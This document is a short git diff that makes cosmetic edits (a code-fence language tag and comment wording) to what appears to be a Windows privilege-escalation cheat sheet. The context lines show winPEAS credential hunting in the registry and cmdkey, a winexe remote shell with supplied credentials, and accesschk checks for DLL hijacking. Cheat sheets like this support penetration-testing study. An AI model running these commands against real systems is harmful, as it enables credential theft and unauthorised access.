@@ -663,12 +663,12 @@ python3 exploit.py
 
 ### Credential Access
 
-```bash
+```ps1
 #######################################################################
 ##### 1. Credentials from registry ####################################
 #######################################################################
 
-# Using Winpeas
+# Winpeas Enumeration
 .\winPEASany.exe quiet filesinfo userinfo
 
 # Manual search (Local Machine and Current User)
@@ -686,7 +686,7 @@ winexe -U '{USER}%{PASSWORD}' //{IP ADDRESS} cmd.exe
 #### 2. Credentials from cmdkey #########################################
 #########################################################################
 
-# Using Winpeas
+# Winpeas Enumeration
 .\winPEASany.exe quiet cmd windowscreds
 
 # We can verify this manually using the following command:
@@ -813,6 +813,7 @@ net start filepermsvc
 #######################
 # 5. DLL Hijacking ####
 #######################
+
 # Verify permissions of to start service using accesschk
 .\accesschk.exe /accepteula -uvqc dllsvc
 
